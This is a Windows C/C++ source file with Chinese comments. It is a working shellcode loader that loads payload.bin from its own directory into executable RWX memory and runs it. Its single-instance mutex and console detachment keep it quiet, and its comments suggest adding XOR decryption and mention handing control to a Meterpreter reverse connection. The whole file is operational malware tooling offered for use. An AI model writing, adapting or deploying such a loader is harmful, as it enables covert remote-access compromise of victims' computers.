#include <windows.h>
#include <strsafe.h> // 为了安全地格式化字符串

// 辅助函数：将格式化字符串输出到调试器
void DebugPrint(const char* format, ...)
{
    char    buffer[1024];
    va_list args;
    va_start(args, format);
    StringCchVPrintfA(buffer, sizeof(buffer), format, args);
    va_end(args);
    OutputDebugStringA(buffer);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine,
                      _In_ int nCmdShow)
{
    HANDLE hMutex = ::CreateMutex(NULL, TRUE, L"Global\\MyUniquePayloadMutex123");
    if (hMutex == NULL)
    {
        // 创建互斥体失败，直接退出
        return 1;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        // 互斥体已存在，说明程序已在运行
        CloseHandle(hMutex);
        DebugPrint("****************************");
        return 0; // 静默退出
    }

    FreeConsole();

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH); // 获取自己路径
    char* lastSlash = strrchr(path, '\\');
    if (lastSlash)
        *lastSlash = 0;                        // 去掉文件名，只留目录
    strcat_s(path, MAX_PATH, "\\payload.bin"); // 拼接出完整路径

    // 1. 打开 payload.bin 文件
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DebugPrint("[!] 无法打开 payload.bin 文件。错误码: %d\n", GetLastError());
        return 1;
    }

    // 2. 获取文件大小
    DWORD fileSize = GetFileSize(hFile, NULL);
    DebugPrint("[*] Shellcode 文件大小: %d 字节\n", fileSize);

    // 3. 申请可执行内存 (关键步骤)
    LPVOID execMem = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL)
    {
        DebugPrint("[!] VirtualAlloc 失败。错误码: %d\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    DebugPrint("[*] 内存已分配在地址: 0x%p\n", execMem);

    // 4. 读取文件内容到内存
    DWORD bytesRead;
    if (!ReadFile(hFile, execMem, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        DebugPrint("[!] 读取文件失败。错误码: %d\n", GetLastError());
        VirtualFree(execMem, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    DebugPrint("[*] Shellcode 已成功读取到内存。\n");

    // 5. 可选：解密或解码（如果你的Shellcode被加密了）
    // 这里可以添加你的解密循环，例如与一个密钥进行XOR操作

    // 6. 执行Shellcode（转换为函数指针并调用）
    DebugPrint("[*] 准备执行Shellcode...\n");
    // 可以添加一个简单的延时，方便观察
    // Sleep(3000);

    // 关键执行行
    ((void (*)())execMem)();

    // 理论上，如果Shellcode执行成功（例如建立了反向连接），
    // 这行代码永远不会被执行，因为控制权已经转交给Meterpreter了。
    DebugPrint("[!] Shellcode 执行完毕或返回。\n");

    // 清理内存（通常执行不到这里）
    VirtualFree(execMem, 0, MEM_RELEASE);
    return 0;
}
